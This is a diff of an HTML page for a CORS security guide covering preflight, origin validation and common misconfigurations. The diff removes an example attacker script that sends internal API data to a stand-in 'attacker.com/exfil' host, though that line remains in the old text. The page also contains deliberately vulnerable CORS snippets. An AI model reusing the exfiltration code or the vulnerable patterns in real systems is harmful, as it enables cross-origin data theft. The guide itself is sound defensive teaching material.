@@ -19,13 +19,13 @@
     <meta property="og:type" content="article">
     <meta property="og:site_name" content="SourceHub">
     <meta property="og:locale" content="en_US">
-    <meta property="og:image" content="https://dingjiu1989-hue.github.io/images/logo.png">
-    <meta property="og:image:width" content="512">
-    <meta property="og:image:height" content="512">
+    <meta property="og:image" content="https://dingjiu1989-hue.github.io/images/covers/en/security/cors-security.png">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
     <meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:title" content="CORS Security">
     <meta name="twitter:description" content="In-depth guide to CORS security covering proper origin validation, preflight handling, common misconfigurations, and real-world exploit scenarios.">
-    <meta name="twitter:image" content="https://dingjiu1989-hue.github.io/images/logo.png">
+    <meta name="twitter:image" content="https://dingjiu1989-hue.github.io/images/covers/en/security/cors-security.png">
     <title>CORS Security — SourceHub</title>
     <meta name="description" content="In-depth guide to CORS security covering proper origin validation, preflight handling, common misconfigurations, and real-world exploit scenarios.">
     <link rel="stylesheet" href="/css/style.css">
@@ -38,15 +38,15 @@
       "@type": "Article",
       "headline": "CORS Security",
       "description": "In-depth guide to CORS security covering proper origin validation, preflight handling, common misconfigurations, and real-world exploit scenarios.",
-      "image": "https://dingjiu1989-hue.github.io/images/logo.png",
+      "image": "https://dingjiu1989-hue.github.io/images/covers/en/security/cors-security.png",
       "datePublished": "2026-05-12",
       "dateModified": "2026-05-12",
-      "wordCount": "1518",
+      "wordCount": "1245",
       "keywords": "Security, DevOps, Cloud",
       "author": {"@type": "Person", "name": "SourceHub"},
       "publisher": {"@type": "Organization", "name": "SourceHub", "logo": {"@type": "ImageObject", "url": "https://dingjiu1989-hue.github.io/images/logo.png"}},
       "mainEntityOfPage": {"@type": "WebPage", "@id": "https://dingjiu1989-hue.github.io/en/security/cors-security.html"},
-      "articleBody": "CORS Security Introduction Cross-Origin Resource Sharing (CORS) is a browser mechanism that controls which origins can access resources on a different origin. While CORS enables legitimate cross-origin requests, misconfigurations are among the most common security vulnerabilities discovered in modern web applications. How CORS Works CORS works through HTTP headers that the server sends to tell the browser which origins are permitted. The browser enforces these restrictions on the client side. Simple Requests A simple request uses standard methods (GET, HEAD, POST) and headers. The browser adds an `Origin` header, and the server responds with `Access-Control-Allow-Origin`. Request: GET /api/data HTTP/1.1 Origin: https://trusted-app.com Response: HTTP/1.1 200 OK Access-Control-Allow-Origin: https://trusted-app.com Preflight Requests For non-simple requests (custom headers, PUT, DELETE, content types other than form data), the browser sends an OPTIONS preflight request first. Preflight: OPTIONS /api/data HTTP/1.1 Origin: https://trusted-app.com Access-Control-Request-Method: DELETE Access-Control-Request-Headers: X-Custom-Header Response: HTTP/1.1 204 No Content Access-Control-Allow-Origin: https://trusted-app.com Access-Control-Allow-Methods: GET, POST, PUT, DELETE Access-Control-Allow-Headers: X-Custom-Header Access-Control-Max-Age: 3600 Proper Origin Validation Never reflect the `Origin` header back unconditionally. This is the most common dangerous CORS misconfiguration. # UNSAFE: Reflective origin (vulnerable to attack) def cors_unsafe(request): origin = request.headers.get('Origin') response.headers['Access-Control-Allow-Origin'] = origin # NEVER do this response.headers['Access-Control-Allow-Credentials'] = 'true' # SAFE: Whitelist-based origin validation ALLOWED_ORIGINS = { 'https://app.example.com', 'https://admin.example.com', 'https://trusted-partner.com', } def cors_safe(request): origin = request.headers.get('Origin') if origin in ALLOWED_ORIGINS: response.headers['Access-Control-Allow-Origin'] = origin response.headers['Vary'] = 'Origin' if origin and is_origin_allowed(origin): response.headers['Access-Control-Allow-Origin'] = origin response.headers['Vary'] = 'Origin' def is_origin_allowed(origin): from urllib.parse import urlparse parsed = urlparse(origin) # Must be HTTPS if parsed.scheme != 'https': return False # Exact match only, no wildcards for credentialed requests return parsed.geturl() in ALLOWED_ORIGINS Common Misconfigurations 1\\. Wildcard with Credentials # VULNERABLE: Wildcard origin with credentials response.headers['Access-Control-Allow-Origin'] = '*' response.headers['Access-Control-Allow-Credentials'] = 'true' # Browsers will reject this combination, but attackers can still exploit # applications that don't rely on browser enforcement (e.g., server-side CORS) 2\\. Overly Permissive Origin Match # VULNERABLE: Subdomain matching that is too permissive def unsafe_origin_check(origin): # Accepts evil.example.com as matching example.com return origin.endswith('.example.com') or origin == 'example.com' # Also vulnerable: origin contains 'example.com' would match evil-example.com 3\\. Null Origin # VULNERABLE: Allow null origin if origin == 'null': response.headers['Access-Control-Allow-Origin'] = 'null' # null origin is used by file://, sandboxed iframes, and some # automated scanners. Attackers can exploit this. Exploit Scenarios Internal Network API Attack An attacker hosts a malicious site that performs cross-origin requests to internal APIs. If the internal API reflects origins, the attacker can exfiltrate sensitive data. fetch('https://internal-api.corp.example.com/employees', { credentials: 'include' }) .then(r => r.text()) .then(data => { fetch('https://attacker.com/exfil?data=' + btoa(data)); }); CORS Configuration Best Practices from flask import Flask, request, jsonify from functools import wraps app = Flask(__name__) def cors_allowed(origin): ALLOWED = [ 'https://app.example.com', 'https://dashboard.example.com', ] return origin in ALLOWED def cors_middleware(f): @wraps(f) def decorated(*args, **kwargs): origin = request.headers.get('Origin') if request.method == 'OPTIONS': response = app.make_default_options_response() else: response = f(*args, **kwargs) if origin and cors_allowed(origin): response.headers['Access-Control-Allow-Origin'] = origin response.headers['Vary'] = 'Origin' response.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE' response.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization' response.headers['Access-Control-Max-Age'] = '3600' if request.cookies: response.headers['Access-Control-Allow-Credentials'] = 'true' return response return decorated Conclusion CORS misconfigurations remain a top web vulnerability. Never reflect origins dynamically, never use wildcard with credentials, validate origins against an allowlist, and always set the `Vary: Origin` header when using dynamic CORS. Remember that CORS is a browser-enforced policy \u2014 protect sensitive endpoints with proper authentication regardless."
+      "articleBody": "CORS Security CORS Security Introduction Cross-Origin Resource Sharing (CORS) is a browser mechanism that controls which origins can access resources on a different origin. While CORS enables legitimate cross-origin requests, misconfigurations are among the most common security vulnerabilities discovered in modern web applications. How CORS Works CORS works through HTTP headers that the server sends to tell the browser which origins are permitted. The browser enforces these restrictions on the client side. Simple Requests A simple request uses standard methods (GET, HEAD, POST) and headers. The browser adds an `Origin` header, and the server responds with `Access-Control-Allow-Origin`. Request: GET /api/data HTTP/1.1 Origin: https://trusted-app.com Response: HTTP/1.1 200 OK Access-Control-Allow-Origin: https://trusted-app.com Preflight Requests For non-simple requests (custom headers, PUT, DELETE, content types other than form data), the browser sends an OPTIONS preflight request first. Preflight: OPTIONS /api/data HTTP/1.1 Origin: https://trusted-app.com Access-Control-Request-Method: DELETE Access-Control-Request-Headers: X-Custom-Header Response: HTTP/1.1 204 No Content Access-Control-Allow-Origin: https://trusted-app.com Access-Control-Allow-Methods: GET, POST, PUT, DELETE Access-Control-Allow-Headers: X-Custom-Header Access-Control-Max-Age: 3600 Proper Origin Validation Never reflect the `Origin` header back unconditionally. This is the most common dangerous CORS misconfiguration. UNSAFE: Reflective origin (vulnerable to attack) def cors_unsafe(request): origin = request.headers.get('Origin') response.headers['Access-Control-Allow-Origin'] = origin # NEVER do this response.headers['Access-Control-Allow-Credentials'] = 'true' SAFE: Whitelist-based origin validation ALLOWED_ORIGINS = { 'https://app.example.com', 'https://admin.example.com', 'https://trusted-partner.com', } def cors_safe(request): origin = request.headers.get('Origin') if origin in ALLOWED_ORIGINS: response.headers['Access-Control-Allow-Origin'] = origin response.headers['Vary'] = 'Origin' if origin and is_origin_allowed(origin): response.headers['Access-Control-Allow-Origin'] = origin response.headers['Vary'] = 'Origin' def is_origin_allowed(origin): from urllib.parse import urlparse parsed = urlparse(origin) Must be HTTPS if parsed.scheme != 'https': return False Exact match only, no wildcards for credentialed requests return parsed.geturl() in ALLOWED_ORIGINS Common Misconfigurations 1\\\\. Wildcard with Credentials VULNERABLE: Wildcard origin with credentials response.headers['Access-Control-Allow-Origin'] = '*' response.headers['Access-Control-Allow-Credentials'] = 'true' Browsers will reject this combination, but attackers can still exploit applications that don't rely on browser enforcement (e.g., server-side CORS) 2\\\\. Overly Permissive Origin Match VULNERABLE: Subdomain matching that is too permissive def unsafe_origin_check(origin): Accepts evil.example.com as matching example.com return origin.endswith('.example.com') or origin == 'example.com' Also vulnerable: origin contains 'example.com' would match evil-example.com 3\\\\. Null Origin VULNERABLE: Allow null origin if origin == 'null': response.headers['Access-Control-Allow-Origin'] = 'null' null origin is used by file://, sandboxed iframes, and some automated scanners. Attackers can exploit this. Exploit Scenarios Internal Network API Attack An attacker hosts a malicious site that performs cross-origin requests to internal APIs. If the internal API reflects origins, the attacker can exfiltrate sensitive data. CORS Configuration Best Practices from flask import Flask, request, jsonify from functools import wraps app = Flask(__name__) def cors_allowed(origin): ALLOWED = [ 'https://app.example.com', 'https://dashboard.example.com', ] return origin in ALLOWED def cors_middleware(f): @wraps(f) def decorated(*args, **kwargs): origin = request.headers.get('Origin') if request.method == 'OPTIONS': response = app.make_default_options_response() else: response = f(*args, **kwargs) if origin and cors_allowed(origin): response.headers['Access-Control-Allow-Origin'] = origin response.headers['Vary'] = 'Origin' response.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE' response.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization' response.headers['Access-Control-Max-Age'] = '3600' if request.cookies: response.headers['Access-Control-Allow-Credentials'] = 'true' return response return decorated Conclusion CORS misconfigurations remain a top web vulnerability. Never reflect origins dynamically, never use wildcard with credentials, validate origins against an allowlist, and always set the `Vary: Origin` header when using dynamic CORS. Remember that CORS is a browser-enforced policy \u2014 protect sensitive endpoints with proper authentication regardless."
     }
     </script>
     <script type="application/ld+json">
@@ -75,299 +75,221 @@
         <span class="tag-cat">Cloud</span></div>
       <h1 class="article-title">CORS Security</h1>
       <div class="article-meta">Published 2026-05-12 · 0 views · 0 replies</div>
+      <img class="article-cover" src="https://dingjiu1989-hue.github.io/images/covers/en/security/cors-security.png" alt="CORS Security" width="1200" height="630" loading="lazy">
       <div class="article-body"><h1>CORS Security</h1>
 <br>
-<p>Introduction   </p>
-<p>Cross-Origin Resource Sharing (CORS) is a browser mechanism that controls which origins can access resources on a different origin. While CORS enables legitimate cross-origin requests, misconfigurations are among the most common security vulnerabilities discovered in modern web applications.   </p>
-<p>How CORS Works   </p>
-<p>CORS works through HTTP headers that the server sends to tell the browser which origins are permitted. The browser enforces these restrictions on the client side.   </p>
-<p>Simple Requests   </p>
-<p>A simple request uses standard methods (GET, HEAD, POST) and headers. The browser adds an `Origin` header, and the server responds with `Access-Control-Allow-Origin`.   </p>
+<h1>CORS Security</h1>
 <br>
+<p>Introduction </p>
 <br>
+<p>Cross-Origin Resource Sharing (CORS) is a browser mechanism that controls which origins can access resources on a different origin. While CORS enables legitimate cross-origin requests, misconfigurations are among the most common security vulnerabilities discovered in modern web applications. </p>
 <br>
-<p>    Request:</p>
+<p>How CORS Works </p>
 <br>
-<p>    GET /api/data HTTP/1.1</p>
+<p>CORS works through HTTP headers that the server sends to tell the browser which origins are permitted. The browser enforces these restrictions on the client side. </p>
 <br>
-<p>    Origin: https://trusted-app.com</p>
+<p>Simple Requests </p>
 <br>
+<p>A simple request uses standard methods (GET, HEAD, POST) and headers. The browser adds an `Origin` header, and the server responds with `Access-Control-Allow-Origin`. </p>
 <br>
+<p>Request:</p>
 <br>
-<p>    Response:</p>
+<p>GET /api/data HTTP/1.1</p>
 <br>
-<p>    HTTP/1.1 200 OK</p>
+<p>Origin: https://trusted-app.com</p>
 <br>
-<p>    Access-Control-Allow-Origin: https://trusted-app.com</p>
+<p>Response:</p>
 <br>
+<p>HTTP/1.1 200 OK</p>
 <br>
+<p>Access-Control-Allow-Origin: https://trusted-app.com</p>
 <br>
+<p>Preflight Requests </p>
 <br>
-<p>Preflight Requests   </p>
-<p>For non-simple requests (custom headers, PUT, DELETE, content types other than form data), the browser sends an OPTIONS preflight request first.   </p>
+<p>For non-simple requests (custom headers, PUT, DELETE, content types other than form data), the browser sends an OPTIONS preflight request first. </p>
 <br>
+<p>Preflight:</p>
 <br>
+<p>OPTIONS /api/data HTTP/1.1</p>
 <br>
-<p>    Preflight:</p>
+<p>Origin: https://trusted-app.com</p>
 <br>
-<p>    OPTIONS /api/data HTTP/1.1</p>
+<p>Access-Control-Request-Method: DELETE</p>
 <br>
-<p>    Origin: https://trusted-app.com</p>
+<p>Access-Control-Request-Headers: X-Custom-Header</p>
 <br>
-<p>    Access-Control-Request-Method: DELETE</p>
+<p>Response:</p>
 <br>
-<p>    Access-Control-Request-Headers: X-Custom-Header</p>
+<p>HTTP/1.1 204 No Content</p>
 <br>
+<p>Access-Control-Allow-Origin: https://trusted-app.com</p>
 <br>
+<p>Access-Control-Allow-Methods: GET, POST, PUT, DELETE</p>
 <br>
-<p>    Response:</p>
+<p>Access-Control-Allow-Headers: X-Custom-Header</p>
 <br>
-<p>    HTTP/1.1 204 No Content</p>
+<p>Access-Control-Max-Age: 3600</p>
 <br>
-<p>    Access-Control-Allow-Origin: https://trusted-app.com</p>
+<p>Proper Origin Validation </p>
 <br>
-<p>    Access-Control-Allow-Methods: GET, POST, PUT, DELETE</p>
+<p>Never reflect the `Origin` header back unconditionally. This is the most common dangerous CORS misconfiguration. </p>
 <br>
-<p>    Access-Control-Allow-Headers: X-Custom-Header</p>
+<h1>UNSAFE: Reflective origin (vulnerable to attack)</h1>
 <br>
-<p>    Access-Control-Max-Age: 3600</p>
+<p>def cors_unsafe(request):</p>
 <br>
+<p>origin = request.headers.get('Origin')</p>
 <br>
+<p>response.headers['Access-Control-Allow-Origin'] = origin # NEVER do this</p>
 <br>
+<p>response.headers['Access-Control-Allow-Credentials'] = 'true'</p>
 <br>
-<p>Proper Origin Validation   </p>
-<p>Never reflect the `Origin` header back unconditionally. This is the most common dangerous CORS misconfiguration.   </p>
+<h1>SAFE: Whitelist-based origin validation</h1>
 <br>
+<p>ALLOWED_ORIGINS = {</p>
 <br>
+<p>'https://app.example.com',</p>
 <br>
-<p>    # UNSAFE: Reflective origin (vulnerable to attack)</p>
+<p>'https://admin.example.com',</p>
 <br>
-<p>    def cors_unsafe(request):</p>
+<p>'https://trusted-partner.com',</p>
 <br>
-<p>        origin = request.headers.get('Origin')</p>
+<p>}</p>
 <br>
-<p>        response.headers['Access-Control-Allow-Origin'] = origin  # NEVER do this</p>
+<p>def cors_safe(request):</p>
 <br>
-<p>        response.headers['Access-Control-Allow-Credentials'] = 'true'</p>
+<p>origin = request.headers.get('Origin')</p>
 <br>
+<p>if origin in ALLOWED_ORIGINS:</p>
 <br>
+<p>response.headers['Access-Control-Allow-Origin'] = origin</p>
 <br>
-<p>    # SAFE: Whitelist-based origin validation</p>
+<p>response.headers['Vary'] = 'Origin'</p>
 <br>
-<p>    ALLOWED_ORIGINS = {</p>
+<p>if origin and is_origin_allowed(origin):</p>
 <br>
-<p>        'https://app.example.com',</p>
+<p>response.headers['Access-Control-Allow-Origin'] = origin</p>
 <br>
-<p>        'https://admin.example.com',</p>
+<p>response.headers['Vary'] = 'Origin'</p>
 <br>
-<p>        'https://trusted-partner.com',</p>
+<p>def is_origin_allowed(origin):</p>
 <br>
-<p>    }</p>
+<p>from urllib.parse import urlparse</p>
 <br>
+<p>parsed = urlparse(origin)</p>
 <br>
+<h1>Must be HTTPS</h1>
 <br>
-<p>    def cors_safe(request):</p>
+<p>if parsed.scheme != 'https':</p>
 <br>
-<p>        origin = request.headers.get('Origin')</p>
+<p>return False</p>
 <br>
+<h1>Exact match only, no wildcards for credentialed requests</h1>
 <br>
+<p>return parsed.geturl() in ALLOWED_ORIGINS</p>
 <br>
-<p>        if origin in ALLOWED_ORIGINS:</p>
+<p>Common Misconfigurations </p>
 <br>
-<p>            response.headers['Access-Control-Allow-Origin'] = origin</p>
+<p>1\\. Wildcard with Credentials </p>
 <br>
-<p>            response.headers['Vary'] = 'Origin'</p>
+<h1>VULNERABLE: Wildcard origin with credentials</h1>
 <br>
+<p>response.headers['Access-Control-Allow-Origin'] = '*'</p>
 <br>
+<p>response.headers['Access-Control-Allow-Credentials'] = 'true'</p>
 <br>
-<p>        if origin and is_origin_allowed(origin):</p>
+<h1>Browsers will reject this combination, but attackers can still exploit</h1>
 <br>
-<p>            response.headers['Access-Control-Allow-Origin'] = origin</p>
+<h1>applications that don't rely on browser enforcement (e.g., server-side CORS)</h1>
 <br>
-<p>            response.headers['Vary'] = 'Origin'</p>
+<p>2\\. Overly Permissive Origin Match </p>
 <br>
+<h1>VULNERABLE: Subdomain matching that is too permissive</h1>
 <br>
+<p>def unsafe_origin_check(origin):</p>
 <br>
-<p>    def is_origin_allowed(origin):</p>
+<h1>Accepts evil.example.com as matching example.com</h1>
 <br>
-<p>        from urllib.parse import urlparse</p>
+<p>return origin.endswith('.example.com') or origin == 'example.com'</p>
 <br>
-<p>        parsed = urlparse(origin)</p>
+<h1>Also vulnerable: origin contains 'example.com' would match evil-example.com</h1>
 <br>
+<p>3\\. Null Origin </p>
 <br>
+<h1>VULNERABLE: Allow null origin</h1>
 <br>
-<p>        # Must be HTTPS</p>
+<p>if origin == 'null':</p>
 <br>
-<p>        if parsed.scheme != 'https':</p>
+<p>response.headers['Access-Control-Allow-Origin'] = 'null'</p>
 <br>
-<p>            return False</p>
+<h1>null origin is used by file://, sandboxed iframes, and some</h1>
 <br>
+<h1>automated scanners. Attackers can exploit this.</h1>
 <br>
+<p>Exploit Scenarios </p>
 <br>
-<p>        # Exact match only, no wildcards for credentialed requests</p>
+<p>Internal Network API Attack </p>
 <br>
-<p>        return parsed.geturl() in ALLOWED_ORIGINS</p>
+<p>An attacker hosts a malicious site that performs cross-origin requests to internal APIs. If the internal API reflects origins, the attacker can exfiltrate sensitive data. </p>
 <br>
+<p>CORS Configuration Best Practices </p>
 <br>
+<p>from flask import Flask, request, jsonify</p>
 <br>
+<p>from functools import wraps</p>
 <br>
-<p>Common Misconfigurations   </p>
-<p>1\. Wildcard with Credentials   </p>
+<p>app = Flask(__name__)</p>
 <br>
+<p>def cors_allowed(origin):</p>
 <br>
+<p>ALLOWED = [</p>
 <br>
-<p>    # VULNERABLE: Wildcard origin with credentials</p>
+<p>'https://app.example.com',</p>
 <br>
-<p>    response.headers['Access-Control-Allow-Origin'] = '*'</p>
+<p>'https://dashboard.example.com',</p>
 <br>
-<p>    response.headers['Access-Control-Allow-Credentials'] = 'true'</p>
+<p>]</p>
 <br>
-<p>    # Browsers will reject this combination, but attackers can still exploit</p>
+<p>return origin in ALLOWED</p>
 <br>
-<p>    # applications that don't rely on browser enforcement (e.g., server-side CORS)</p>
+<p>def cors_middleware(f):</p>
 <br>
+<p>@wraps(f)</p>
 <br>
+<p>def decorated(*args, **kwargs):</p>
 <br>
+<p>origin = request.headers.get('Origin')</p>
 <br>
-<p>2\. Overly Permissive Origin Match   </p>
+<p>if request.method == 'OPTIONS':</p>
 <br>
+<p>response = app.make_default_options_response()</p>
 <br>
+<p>else:</p>
 <br>
-<p>    # VULNERABLE: Subdomain matching that is too permissive</p>
+<p>response = f(*args, **kwargs)</p>
 <br>
-<p>    def unsafe_origin_check(origin):</p>
+<p>if origin and cors_allowed(origin):</p>
 <br>
-<p>        # Accepts evil.example.com as matching example.com</p>
+<p>response.headers['Access-Control-Allow-Origin'] = origin</p>
 <br>
-<p>        return origin.endswith('.example.com') or origin == 'example.com'</p>
+<p>response.headers['Vary'] = 'Origin'</p>
 <br>
-<p>        # Also vulnerable: origin contains 'example.com' would match evil-example.com</p>
+<p>response.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE'</p>
 <br>
+<p>response.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization'</p>
 <br>
+<p>response.headers['Access-Control-Max-Age'] = '3600'</p>
 <br>
+<p>if request.cookies:</p>
 <br>
-<p>3\. Null Origin   </p>
+<p>response.headers['Access-Control-Allow-Credentials'] = 'true'</p>
 <br>
+<p>return response</p>
 <br>
+<p>return decorated</p>
 <br>
-<p>    # VULNERABLE: Allow null origin</p>
+<p>Conclusion </p>
 <br>
-<p>    if origin == 'null':</p>
-<br>
-<p>        response.headers['Access-Control-Allow-Origin'] = 'null'</p>
-<br>
-<p>        # null origin is used by file://, sandboxed iframes, and some</p>
-<br>
-<p>        # automated scanners. Attackers can exploit this.</p>
-<br>
-<br>
-<br>
-<br>
-<p>Exploit Scenarios   </p>
-<p>Internal Network API Attack   </p>
-<p>An attacker hosts a malicious site that performs cross-origin requests to internal APIs. If the internal API reflects origins, the attacker can exfiltrate sensitive data.   </p>
-<br>
-<br>
-<br>
-<p>    <!-- Attacker's page --></p>
-<br>
-<p>    <script></p>
-<br>
-<p>    fetch('https://internal-api.corp.example.com/employees', {</p>
-<br>
-<p>        credentials: 'include'</p>
-<br>
-<p>    })</p>
-<br>
-<p>    .then(r => r.text())</p>
-<br>
-<p>    .then(data => {</p>
-<br>
-<p>        fetch('https://attacker.com/exfil?data=' + btoa(data));</p>
-<br>
-<p>    });</p>
-<br>
-<p>    </script></p>
-<br>
-<br>
-<br>
-<br>
-<p>CORS Configuration Best Practices   </p>
-<br>
-<br>
-<br>
-<p>    from flask import Flask, request, jsonify</p>
-<br>
-<p>    from functools import wraps</p>
-<br>
-<br>
-<br>
-<p>    app = Flask(__name__)</p>
-<br>
-<br>
-<br>
-<p>    def cors_allowed(origin):</p>
-<br>
-<p>        ALLOWED = [</p>
-<br>
-<p>            'https://app.example.com',</p>
-<br>
-<p>            'https://dashboard.example.com',</p>
-<br>
-<p>        ]</p>
-<br>
-<p>        return origin in ALLOWED</p>
-<br>
-<br>
-<br>
-<p>    def cors_middleware(f):</p>
-<br>
-<p>        @wraps(f)</p>
-<br>
-<p>        def decorated(*args, **kwargs):</p>
-<br>
-<p>            origin = request.headers.get('Origin')</p>
-<br>
-<br>
-<br>
-<p>            if request.method == 'OPTIONS':</p>
-<br>
-<p>                response = app.make_default_options_response()</p>
-<br>
-<p>            else:</p>
-<br>
-<p>                response = f(*args, **kwargs)</p>
-<br>
-<br>
-<br>
-<p>            if origin and cors_allowed(origin):</p>
-<br>
-<p>                response.headers['Access-Control-Allow-Origin'] = origin</p>
-<br>
-<p>                response.headers['Vary'] = 'Origin'</p>
-<br>
-<p>                response.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE'</p>
-<br>
-<p>                response.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization'</p>
-<br>
-<p>                response.headers['Access-Control-Max-Age'] = '3600'</p>
-<br>
-<br>
-<br>
-<p>                if request.cookies:</p>
-<br>
-<p>                    response.headers['Access-Control-Allow-Credentials'] = 'true'</p>
-<br>
-<br>
-<br>
-<p>            return response</p>
-<br>
-<p>        return decorated</p>
-<br>
-<br>
-<br>
-<br>
-<p>Conclusion   </p>
 <p>CORS misconfigurations remain a top web vulnerability. Never reflect origins dynamically, never use wildcard with credentials, validate origins against an allowlist, and always set the `Vary: Origin` header when using dynamic CORS. Remember that CORS is a browser-enforced policy — protect sensitive endpoints with proper authentication regardless.</p></div>
     </article>
     <div style="margin:2rem 0;text-align:center;">
